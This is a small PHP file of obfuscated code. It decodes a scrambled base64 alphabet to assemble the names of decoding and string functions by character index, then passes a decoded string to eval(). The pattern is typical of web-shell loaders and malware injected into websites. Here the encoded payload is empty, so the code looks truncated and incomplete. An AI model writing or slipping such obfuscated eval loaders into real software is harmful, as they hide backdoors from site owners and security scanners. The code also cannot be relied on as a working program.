<?php define('pPFpLw0323',__FILE__);$yDSNfu=base64_decode("bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqYlZrdWZxeEt3WFVjemh5cldUbGFvbUZlQ1FBWVJPdkh0SXNKanBERWRpZ05NTEdQU1puQg==");$MjkPkR=$yDSNfu[3].$yDSNfu[6].$yDSNfu[33].$yDSNfu[30];$vJjxKY=$yDSNfu[33].$yDSNfu[10].$yDSNfu[24].$yDSNfu[10].$yDSNfu[24];$ESUejM=$vJjxKY[0].$yDSNfu[18].$yDSNfu[3].$vJjxKY[0].$vJjxKY[1].$yDSNfu[24];$LTaYzk=$yDSNfu[7].$yDSNfu[13];$MjkPkR.=$yDSNfu[22].$yDSNfu[36].$yDSNfu[29].$yDSNfu[26].$yDSNfu[30].$yDSNfu[32].$yDSNfu[35].$yDSNfu[26].$yDSNfu[30];eval($MjkPkR(""));?>